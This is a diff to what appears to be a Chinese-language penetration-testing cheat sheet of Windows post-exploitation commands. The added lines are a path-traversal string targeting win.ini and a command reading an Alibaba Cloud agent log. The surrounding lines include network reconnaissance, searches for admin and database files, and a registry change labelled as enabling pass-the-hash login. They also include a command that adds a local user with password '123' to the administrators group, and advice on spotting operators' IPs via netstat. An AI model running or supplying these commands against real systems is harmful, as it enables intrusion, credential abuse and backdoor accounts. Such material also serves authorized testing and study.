@@ -8,6 +8,7 @@
 
 ```sh
 # -- windows
+../../../../../../windows/win.ini
 arp -a
 ipconfig /all
 dir /a C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent
@@ -23,6 +24,8 @@ dir D:\ /s | findstr /i ora >c:\tmp.txt # 查找ora文件
 dir /s /b *admin*                       # 查找admin相关文件.
 REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f   # 允许pth登录
 shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add
+
+more C:\Program Files\AliyunService\agent.log
 # 查询数据库连接IP记录 见 30_mssql_sqlserver.md
 
 netstat -lantp | grep ESTABLISHED # 关注sshd进程，即运维人员公司IP
